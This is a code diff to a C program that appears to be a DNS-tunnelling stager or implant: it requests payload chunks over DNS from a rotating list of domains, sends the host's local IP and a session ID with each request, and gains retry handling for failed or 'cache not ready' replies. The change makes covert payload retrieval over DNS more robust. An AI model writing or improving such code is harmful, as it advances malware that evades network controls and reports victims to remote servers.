@@ -1316,36 +1316,77 @@ int main(int argc, char *argv[]) {
                        (i + CHUNKS_PER_BURST - 1 < total_chunks) ? i + CHUNKS_PER_BURST - 1 : total_chunks - 1);
         }
         
-        // Pick random domain for load balancing (client-side round-robin)
-        char *target_domain = domain_list[rand() % domain_count];
-        
-        DEBUG_PRINT("[*] Requesting chunk %d/%d from %s\n", i+1, total_chunks, target_domain);
-        
-        // NEW PROTOCOL: CHUNK|<chunk_index>|<IP>|<session_id>
-        // Changed from ACK to CHUNK for clarity
-        snprintf(message, sizeof(message), "CHUNK|%d|%s|%s", 
-                 i, local_ip, session_id[0] ? session_id : "UNKN0WN");
-        
-        if (send_dns_message(message, target_domain, response, sizeof(response)) != 0) {
-            DIAG_PRINT("[DIAG] Failed to get chunk %d from %s\n", i, target_domain);
-    DEBUG_PRINT("[!] Failed to get chunk %d from %s\n", i, target_domain);
-            goto cleanup;
+        // Retry loop for each chunk - handles transient failures and RETRY responses
+        int chunk_retry;
+        int chunk_success = 0;
+        for (chunk_retry = 0; chunk_retry < MAX_RETRIES && !chunk_success; chunk_retry++) {
+            // Pick random domain for load balancing (client-side round-robin)
+            char *target_domain = domain_list[rand() % domain_count];
+            
+            if (chunk_retry > 0) {
+                DEBUG_PRINT("[*] Retry %d/%d for chunk %d/%d from %s\n", chunk_retry, MAX_RETRIES, i+1, total_chunks, target_domain);
+            } else {
+                DEBUG_PRINT("[*] Requesting chunk %d/%d from %s\n", i+1, total_chunks, target_domain);
+            }
+            
+            // NEW PROTOCOL: CHUNK|<chunk_index>|<IP>|<session_id>
+            // Changed from ACK to CHUNK for clarity
+            snprintf(message, sizeof(message), "CHUNK|%d|%s|%s", 
+                     i, local_ip, session_id[0] ? session_id : "UNKN0WN");
+            
+            if (send_dns_message(message, target_domain, response, sizeof(response)) != 0) {
+                DIAG_PRINT("[DIAG] Failed to get chunk %d from %s (attempt %d)\n", i, target_domain, chunk_retry + 1);
+                DEBUG_PRINT("[!] Failed to get chunk %d from %s (attempt %d)\n", i, target_domain, chunk_retry + 1);
+                // Wait before retry
+#ifdef _WIN32
+                Sleep(RETRY_DELAY_SECONDS * 1000);
+#else
+                sleep(RETRY_DELAY_SECONDS);
+#endif
+                continue;
+            }
+            
+            DIAG_PRINT("[DIAG] Received response for chunk %d: %.80s... (len=%zu)\n", 
+                    i, response, strlen(response));
+            
+            // Check for ERROR responses from server (permanent failure)
+            if (strncmp(response, "ERROR", 5) == 0) {
+                DIAG_PRINT("[DIAG] Server returned ERROR for chunk %d: %s\n", i, response);
+                DEBUG_PRINT("[!] ERROR receiving chunk %d: %s\n", i, response);
+                goto cleanup;
+            }
+            
+            // Check for RETRY responses from server (transient, cache not ready)
+            if (strncmp(response, "RETRY", 5) == 0) {
+                DIAG_PRINT("[DIAG] Server returned RETRY for chunk %d, will retry after delay\n", i);
+                DEBUG_PRINT("[*] Server cache not ready for chunk %d, retrying in %d seconds...\n", i, RETRY_DELAY_SECONDS);
+#ifdef _WIN32
+                Sleep(RETRY_DELAY_SECONDS * 1000);
+#else
+                sleep(RETRY_DELAY_SECONDS);
+#endif
+                continue;
+            }
+            
+            // Parse chunk response: CHUNK|<data>
+            if (strncmp(response, "CHUNK|", 6) != 0) {
+                DIAG_PRINT("[DIAG] Invalid chunk response format (first 20 chars): %.20s\n", response);
+                DEBUG_PRINT("[!] Invalid chunk response format: %s, retrying...\n", response);
+#ifdef _WIN32
+                Sleep(RETRY_DELAY_SECONDS * 1000);
+#else
+                sleep(RETRY_DELAY_SECONDS);
+#endif
+                continue;
+            }
+            
+            // Success!
+            chunk_success = 1;
         }
         
-        DIAG_PRINT("[DIAG] Received response for chunk %d: %.80s... (len=%zu)\n", 
-                i, response, strlen(response));
-        
-        // Check for ERROR responses from server
-        if (strncmp(response, "ERROR", 5) == 0) {
-            DIAG_PRINT("[DIAG] Server returned ERROR for chunk %d: %s\n", i, response);
-    DEBUG_PRINT("[!] ERROR receiving chunk %d: %s\n", i, response);
-            goto cleanup;
-        }
-        
-        // Parse chunk response: CHUNK|<data>
-        if (strncmp(response, "CHUNK|", 6) != 0) {
-            DIAG_PRINT("[DIAG] Invalid chunk response format (first 20 chars): %.20s\n", response);
-    DEBUG_PRINT("[!] Invalid chunk response format: %s\n", response);
+        // Check if we exhausted retries
+        if (!chunk_success) {
+            DEBUG_PRINT("[!] Failed to get chunk %d after %d retries\n", i, MAX_RETRIES);
             goto cleanup;
         }
         
